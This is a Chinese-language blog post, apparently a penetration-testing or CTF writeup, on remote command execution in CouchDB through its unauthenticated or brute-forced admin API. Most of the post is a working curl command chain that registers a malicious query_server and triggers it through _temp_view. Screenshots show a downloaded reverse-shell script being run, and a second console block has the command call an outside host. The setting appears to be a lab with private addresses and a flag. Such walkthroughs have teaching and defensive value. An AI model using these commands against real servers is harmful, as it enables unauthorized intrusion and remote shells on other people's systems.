---
layout:     post
title:      "Couchdb命令执行"
subtitle:   "一点点记录"
date:       2016-09-11
author:     "Urahara"
header-img: "img/Couchdb-RCE.jpg"
header-mask: 0.3
tags:
    - 渗透测试
    - 数据库安全
    - Remote Command Execution

---


## 背景介绍
 CouchDB是一个开源的面向文档的数据库管理系统，可以通过 RESTful JavaScript Object Notation (JSON) API 访问。CouchDB 可以安装在大部分 POSIX 系统上，包括 Linux和 Mac OS X。

## 漏洞介绍
Couchdb默认会在5984端口开放Restful的API接口，如果使用SSL的话就会监听在6984端口，用于数据库的管理功能。其HTTP Server默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过API访问导致未授权访问。

使用nmap扫描可发现couchdb的banner信息
![couchdb默认端口](https://urahara3389.github.io/img/Couchdb-RCE-nmap.png)

>执行命令需要使用admin权限，如果数据库存在未授权则可直接利用，若有账号认证则需要想办法获取admin的密码，当然可通过burpsuit去爆破/_utils/，也可以通过metasploit中的auxiliary/scanner/couchdb/couchdb_login模块直接进行爆破

CouchDB提供了一个可视化界面工具，在浏览器中运行“http://127.0.0.1:5984/_utils/”，即可见到如下所示的界面。
![账号认证](https://urahara3389.github.io/img/Couchdb-RCE-admin.png)

## 漏洞利用
这里举例有账号认证的情况，我们需要使用admin身份登录然后获取cookie，再使用curl命令与api进行交互，实现数据库操作
![获取Cookie](https://urahara3389.github.io/img/Couchdb-RCE-cookie.png)

>远程命令执行示例
1. 新增query_server配置，写入要执行的命令；
2. 新建一个临时库和临时表，插入一条记录；
3. 调用query_server处理数据

```basic
curl -X PUT 'http://192.168.199.181:5984/_config/query_servers/cmd' -d '"python /tmp/back.py"'  -H "Cookie: AuthSession=YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4"

curl -X PUT 'http://192.168.199.181:5984/teeest'  -H "Cookie: AuthSession=YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4"```

curl -X PUT 'http://192.168.199.181:5984/teeest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'  -H "Cookie: AuthSession=YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4"```

curl -X POST 'http://192.168.199.181:5984/teeest/_temp_view?limit=11' -d '{"language":"cmd","map":""}' -H 'Content-Type: application/json'  -H "Cookie: AuthSession=YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4"
```

远程下载反弹脚本
![写入命令](https://urahara3389.github.io/img/Couchdb-RCE-command.png)
成功监听到下载请求
![监听下载](https://urahara3389.github.io/img/Couchdb-RCE-download.png)
添加执行权限
![添加执行权限](https://urahara3389.github.io/img/Couchdb-RCE-chmod.png)
执行反弹脚本
![执行反弹](https://urahara3389.github.io/img/Couchdb-RCE-backshell.png)
getshell，读取flag
![成功](https://urahara3389.github.io/img/Couchdb-RCE-over.png)
> 同样你也可以不用登录获取Cookie，直接在curl请求中带入账号密码也是可以的，类似于这样，执行效果是一样的，这种方法可能更方便点吧

```basic
root@Urahara:~# curl -X PUT 'admin:1qaz2wsx@192.168.199.165:5984/_config/query_servers/cmd' -d '"curl http://192.168.199.140/flag"'
"curl http://192.168.199.140/flag"
root@Urahara:~# curl -X PUT 'admin:1qaz2wsx@192.168.199.165:5984/wa'
{"ok":true}
root@Urahara:~# curl -X PUT 'admin:1qaz2wsx@192.168.199.165:5984/wa/haha' -d '{"_id":"770895a97726d5ca6d70a22173005c7a"}'{"ok":true,"id":"haha","rev":"1-967a00dff5e02add41819138abb3284d"}
root@Urahara:~# curl -X POST 'admin:1qaz2wsx@192.168.199.165:5984/wa/_temp_view?limit=14' -d '{"language":"cmd","map":""}' -H 'Content-Type: application/json'
```


### 参考
[CouchDB未授权访问导致执行任意系统命令漏洞](https://www.secpulse.com/archives/45917.html)

[CouchDB未授权访问漏洞导致系统命令执行](http://blog.nsfocus.net/couchdb-unauthorized-access-vulnerability-system-command/)